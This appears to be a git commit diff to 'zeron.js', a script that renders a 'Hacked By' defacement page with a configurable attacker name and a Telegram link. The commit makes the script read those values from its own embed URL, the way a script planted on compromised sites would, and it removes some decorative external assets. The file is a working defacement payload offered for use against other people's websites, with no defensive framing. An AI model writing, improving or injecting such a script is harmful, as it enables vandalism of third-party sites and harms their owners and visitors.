9fe73797f813339be6c83dfbcb0143e09f251f53
ZeronModz <zeronmodz@gmail.com>
2026-05-02 01:32:26 +0600

    Update zeron.js

--- public/zeron.js
+++ public/zeron.js
@@ -3,11 +3,12 @@
 (function () {
 
   function getParams() {
-    const params = new URLSearchParams(window.location.search);
+    const script = document.currentScript;
+    const url = new URL(script.src);
 
     return {
-      name: params.get("name") || "Xeron",
-      message: params.get("message") || "https://t.me/CodeDevZeron"
+      name: url.searchParams.get("name") || "Xeron",
+      message: url.searchParams.get("message") || "https://t.me/CodeDevZeron"
     };
   }
 
@@ -20,35 +21,22 @@
 <html>
 <head>
 <title>Hacked By ${name}</title>
-
 <style>
 body {
-  background: url("https://cdn.prinsh.com/data-1/images/NathanPrinsley-hacker-aesthetic.jpg") no-repeat center center fixed;
-  background-size: 100% 100%;
-  font-family: Verdana;
+  background: black;
+  color: #00ffcc;
   text-align:center;
-  margin-top: 40px;
+  font-family: monospace;
+  margin-top: 50px;
 }
-h1 { color:#de0707; }
-h2 { color:#07ad1d; }
-p { color:#00ffff; font-size:18px; }
-a { color:#00ffcc; text-decoration:none; }
+a { color:#00ffcc; }
 </style>
-
 </head>
 
 <body>
 
-<img src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo.png" width="200">
-
 <h1>Hacked By ${name}</h1>
 <h2><a href="${message}" target="_blank">${message}</a></h2>
-
-<p>${name} 😈</p>
-
-<audio src="https://cdn.prinsh.com/data-1/mp3/best-hacker-music.mp3" autoplay loop></audio>
-
-<script src="https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js"><\/script>
 
 </body>
 </html>
